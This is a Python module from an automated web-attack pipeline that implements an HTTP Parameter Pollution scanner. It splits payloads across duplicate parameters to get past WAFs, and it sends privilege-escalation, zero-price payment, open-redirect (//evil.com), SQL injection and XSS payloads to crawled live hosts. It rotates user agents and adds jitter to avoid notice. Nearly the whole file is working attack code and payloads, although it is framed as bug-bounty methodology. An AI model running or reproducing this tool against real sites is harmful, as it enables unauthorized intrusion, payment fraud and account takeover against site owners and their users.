#!/usr/bin/env python3
# modules/step32_param_pollution.py — HTTP Parameter Pollution V7
# NEW MODULE: HPP bypass WAF, duplicate params, array injection
# Source: CEH Ch12 + Bug Bounty Bootcamp — HPP methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.parse, urllib.request, urllib.error
from core.utils import safe_read

# ── HPP techniques by server type ────────────────────────────────────────────
# Different servers handle duplicate params differently:
# PHP/Apache: last wins  → ?a=1&a=2 → a=2
# ASP.NET:    comma join → ?a=1&a=2 → a=1,2
# JSP/Tomcat: first wins → ?a=1&a=2 → a=1
# Flask/Py:   list       → ?a=1&a=2 → a=[1,2]

HPP_BYPASS_TEMPLATES = [
    # WAF bypass: split malicious payload across duplicate params
    "{param}=safe&{param}={payload}",
    "{param}={payload}&{param}=safe",
    "{param}[]=safe&{param}[]={payload}",
    "{param}[0]=safe&{param}[1]={payload}",
    # Array injection
    "{param}[]={payload}",
    "{param}[foo]={payload}",
    # Double encoding
    "%26{param}%3D{payload}",
    # Comma join exploitation (ASP.NET)
    "{param}={payload},safe",
    "{param}=safe,{payload}",
]

# ── High-value params for HPP testing ────────────────────────────────────────
HPP_TARGET_PARAMS = [
    # Auth/access control bypass
    ("role",       "admin",          "Privilege escalation"),
    ("is_admin",   "true",           "Admin flag injection"),
    ("user_id",    "1",              "User ID tampering"),
    ("account_id", "1",              "Account ID tampering"),
    # Payment bypass
    ("price",      "0",              "Price manipulation"),
    ("amount",     "0.01",           "Amount manipulation"),
    ("quantity",   "-1",             "Negative quantity"),
    ("discount",   "100",            "100% discount"),
    # Redirect abuse
    ("redirect",   "//evil.com",     "Open redirect via HPP"),
    ("return_url", "//evil.com",     "Return URL abuse"),
    # SQL bypass via HPP
    ("id",         "1 OR 1=1",       "SQLi via HPP"),
    ("search",     "' OR '1'='1",    "SQLi via HPP"),
    # XSS via HPP
    ("name",       "<svg/onload=alert(1)>", "XSS via HPP"),
    ("q",          "<img/src=x onerror=alert(1)>", "XSS via HPP"),
]

# ── Indicators that HPP was exploited ────────────────────────────────────────
HPP_SUCCESS_INDICATORS = {
    "admin":      [re.compile(r'"role"\s*:\s*"admin"', re.I),
                   re.compile(r'"is_admin"\s*:\s*true', re.I)],
    "price":      [re.compile(r'"price"\s*:\s*0', re.I),
                   re.compile(r'"amount"\s*:\s*0', re.I)],
    "redirect":   [re.compile(r'location:\s*//evil', re.I)],
    "sqli":       [re.compile(r'sql syntax|ora-\d{4}', re.I)],
    "xss":        [re.compile(r'<svg.{0,20}onload', re.I),
                   re.compile(r'onerror=alert', re.I)],
}

SENSITIVE_PARAMS = {p for p,_,_ in HPP_TARGET_PARAMS}


class Step32ParamPollution:
    """
    HTTP Parameter Pollution scanner.
    CEH Ch12 + Bug Bounty Bootcamp:
    1. Find parameterized URLs
    2. Duplicate parameters with malicious values
    3. Detect if server processes the injected value
    4. Test WAF bypass (split payload across params)
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("hpp_results",
                             f"{p.out}/{p.prefix}_hpp.txt")
        urls  = safe_read(p.files.get("urls",""))
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not urls and not live:
            p.log.warn("HPP: no targets"); return

        auth_h = self._build_auth(p)
        candidates = self._build_candidates(urls, live)
        p.log.info(f"HPP V7: {len(candidates)} candidates — WAF bypass + param injection")

        for url, param, orig_val in candidates[:60]:
            r = self._test_hpp(url, param, orig_val, auth_h, out)
            found += r
            if r: p.bypass.jitter()

        p.log.success(f"HPP V7: {found} findings")

    # ── Build test candidates ─────────────────────────────────────────────────
    def _build_candidates(self, urls: list, live: list) -> list:
        seen   = set()
        result = []

        # From crawled URLs
        for url in urls[:500]:
            if "?" not in url: continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                for param, vals in qs.items():
                    key = f"{parsed.netloc}{parsed.path}?{param}"
                    if key not in seen:
                        seen.add(key)
                        result.append((url, param, vals[0] if vals else ""))
            except Exception:
                pass

        # Add high-value params on each live host
        for host in live[:3]:
            host = host.rstrip("/")
            for target_param, _, _ in HPP_TARGET_PARAMS[:8]:
                url = f"{host}/search?{target_param}=test"
                key = f"{host}?{target_param}"
                if key not in seen:
                    seen.add(key)
                    result.append((url, target_param, "test"))

        return result[:100]

    # ── HPP test ──────────────────────────────────────────────────────────────
    def _test_hpp(self, url: str, param: str, orig_val: str,
                  auth_h: dict, out: str) -> int:
        """Test each HPP technique and check for exploitation."""
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return 0

        baseline = self._fetch(url, auth_h)
        if not baseline: return 0
        base_body = baseline.get("body","")
        base_len  = len(base_body)
        base_st   = baseline.get("status",0)

        for target_param, payload, category in HPP_TARGET_PARAMS[:10]:
            if target_param.lower() != param.lower():
                continue

            for tmpl in HPP_BYPASS_TEMPLATES[:5]:
                # Build polluted query
                try:
                    pollution = tmpl.format(param=param, payload=payload)
                    base_qs   = urllib.parse.urlencode(
                        {k: v[0] for k,v in qs.items() if k != param})
                    test_url  = urllib.parse.urlunparse(
                        parsed._replace(
                            query=f"{base_qs}&{pollution}" if base_qs
                                  else pollution))
                except Exception:
                    continue

                resp = self._fetch(test_url, auth_h)
                if not resp: continue

                body = resp.get("body","")
                st   = resp.get("status",0)

                # Check exploitation indicators
                exploited = self._check_exploited(body, st, base_body,
                                                   base_st, category, payload)
                if exploited:
                    detail = (f"HPP {category}: param={param} "
                              f"payload='{payload[:40]}' "
                              f"template='{tmpl[:40]}' — {exploited}")
                    with open(out,"a") as f:
                        f.write(f"HPP: {url} | {detail}\n")
                    self.p.add_finding(
                        "high" if "privilege" in category.lower() or "sqli" in category.lower()
                              else "medium",
                        "HTTP_PARAM_POLLUTION", url, detail, "hpp-v7",
                        payload=test_url)
                    return 1
        return 0

    # ── Check if exploitation succeeded ───────────────────────────────────────
    def _check_exploited(self, body, st, base_body, base_st,
                          category, payload) -> str:
        # Status code changed
        if base_st in (400,403,422) and st == 200:
            return f"WAF bypass: status changed {base_st}→{st}"

        # Payload reflected or processed
        cat_lower = category.lower()
        if "privilege" in cat_lower or "admin" in cat_lower:
            for pat in HPP_SUCCESS_INDICATORS.get("admin",[]):
                if pat.search(body):
                    return "admin role/flag set in response"

        if "price" in cat_lower or "amount" in cat_lower:
            for pat in HPP_SUCCESS_INDICATORS.get("price",[]):
                if pat.search(body):
                    return "price/amount manipulated to 0"

        if "redirect" in cat_lower:
            if "evil.com" in body.lower():
                return "redirect to attacker domain accepted"

        if "sqli" in cat_lower:
            for pat in HPP_SUCCESS_INDICATORS.get("sqli",[]):
                if pat.search(body):
                    return "SQL error triggered via HPP"

        if "xss" in cat_lower:
            if payload.lower() in body.lower():
                if "<svg" in body.lower() or "onerror" in body.lower():
                    return "XSS payload reflected via HPP"

        return ""

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = f"Bearer {a}" if not a.startswith("Bearer") else a
        return hdrs

    def _fetch(self, url, auth, timeout=8) -> dict:
        try:
            req  = urllib.request.Request(
                url, headers={**auth, "User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body": resp.read(30000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(2000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None
